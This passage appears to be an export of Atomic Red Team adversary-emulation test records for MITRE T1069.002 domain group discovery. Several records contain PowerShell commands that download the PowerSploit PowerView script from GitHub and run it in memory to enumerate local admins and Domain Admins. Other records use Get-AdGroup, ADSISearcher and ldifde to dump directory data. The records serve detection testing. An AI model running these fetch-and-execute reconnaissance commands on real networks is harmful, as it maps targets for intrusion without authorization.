</li>
<li>
<p><strong>command</strong>: [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Find-LocalAdminAccess -Verbose</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li><strong>cleanup_command</strong>: </li>
<li><strong>mitre_id</strong>: T1069.002</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: a5f0d9f8-d3c9-46c0-8378-846ddd6b1cbd</li>
<li><strong>name</strong>: Find local admins on all machines in domain (PowerView)</li>
<li>
<p><strong>description</strong>: Enumerates members of the local Administrators groups across all machines in the domain. Upon execution, information about each machine will be displayed.</p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li>
<p><strong>command</strong>: [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Invoke-EnumerateLocalAdmin  -Verbose</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li><strong>cleanup_command</strong>: </li>
<li><strong>mitre_id</strong>: T1069.002</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 64fdb43b-5259-467a-b000-1b02c00e510a</li>
<li><strong>name</strong>: Find Local Admins via Group Policy (PowerView)</li>
<li>
<p><strong>description</strong>: takes a computer and determines who has admin rights over it through GPO enumeration. Upon execution, information about the machine will be displayed.</p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li>
<p><strong>command</strong>: [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Find-GPOComputerAdmin -ComputerName #{computer_name} -Verbose</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li><strong>cleanup_command</strong>: </li>
<li><strong>mitre_id</strong>: T1069.002</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 3d1fcd2a-e51c-4cbe-8d84-9a843bad8dc8</li>
<li><strong>name</strong>: Enumerate Active Directory Groups with Get-AdGroup</li>
<li>
<p><strong>description</strong>: The following Atomic test will utilize Get-AdGroup to enumerate groups within Active Directory.
Upon successful execution a listing of groups will output with their paths in AD.
Reference: https://docs.microsoft.com/en-us/powershell/module/activedirectory/get-adgroup?view=windowsserver2022-ps</p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li>
<p><strong>command</strong>: Get-AdGroup -Filter *</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li><strong>cleanup_command</strong>: </li>
<li><strong>mitre_id</strong>: T1069.002</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 9f4e344b-8434-41b3-85b1-d38f29d148d0</li>
<li><strong>name</strong>: Enumerate Active Directory Groups with ADSISearcher</li>
<li>
<p><strong>description</strong>: The following Atomic test will utilize ADSISearcher to enumerate groups within Active Directory.
Upon successful execution a listing of groups will output with their paths in AD.
Reference: https://devblogs.microsoft.com/scripting/use-the-powershell-adsisearcher-type-accelerator-to-search-active-directory/</p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li>
<p><strong>command</strong>: ([adsisearcher]"objectcategory=group").FindAll(); ([adsisearcher]"objectcategory=group").FindOne()</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li><strong>cleanup_command</strong>: </li>
<li><strong>mitre_id</strong>: T1069.002</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 46352f40-f283-4fe5-b56d-d9a71750e145</li>
<li><strong>name</strong>: Get-DomainGroupMember with PowerView</li>
<li>
<p><strong>description</strong>: Utilizing PowerView, run Get-DomainGroupMember to identify domain users. Upon execution, progress and info about groups within the domain being scanned will be displayed.</p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li>
<p><strong>command</strong>: [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainGroupMember "Domain Admins"</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li><strong>cleanup_command</strong>: </li>
<li><strong>mitre_id</strong>: T1069.002</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 5a8a181c-2c8e-478d-a943-549305a01230</li>
<li><strong>name</strong>: Get-DomainGroup with PowerView</li>
<li>
<p><strong>description</strong>: Utilizing PowerView, run Get-DomainGroup to identify the domain groups. Upon execution, Groups within the domain will be listed.</p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li>
<p><strong>command</strong>: [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainGroup -verbose</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li><strong>cleanup_command</strong>: </li>
<li><strong>mitre_id</strong>: T1069.002</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 22cf8cb9-adb1-4e8c-80ca-7c723dfc8784</li>
<li><strong>name</strong>: Active Directory Enumeration with LDIFDE</li>
<li>
<p><strong>description</strong>: Output information from Active Directory to a specified file. <a href="https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/cc731033(v=ws.11)">Ldifde</a> is a CLI tool for creating, modifying and deleting directory objects.
The test is derived from the CISA Report on Voly Typhoon. Reference: https://media.defense.gov/2023/May/24/2003229517/-1/-1/0/CSA_Living_off_the_Land.PDF</p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li>
<p><strong>command</strong>: ldifde.exe -f #{output_path}#{output_file} -p subtree</p>
</li>
<li>
<p><strong>prereq_command</strong>: Try {
    Import-Module ActiveDirectory -ErrorAction Stop | Out-Null
    exit 0
}
Catch {
    exit 1
}</p>
</li>
<li>
<p><strong>get_prereq_command</strong>: if((Get-CimInstance -ClassName Win32_OperatingSystem).ProductType -eq 1) {
  Add-WindowsCapability -Name (Get-WindowsCapability -Name RSAT.ActiveDirectory.DS* -Online).Name -Online
} else {
  Install-WindowsFeature RSAT-AD-PowerShell
}</p>
</li>
<li>
<p><strong>cleanup_command</strong>: del #{output_path}#{output_file}</p>
</li>
<li>
<p><strong>mitre_id</strong>: T1069.002</p>
</li>
<li><strong>input_arguments.output_file</strong>: {'description': 'The filename to be created by ldifde', 'type': 'string', 'default': 'atomic_ldifde.txt'}</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
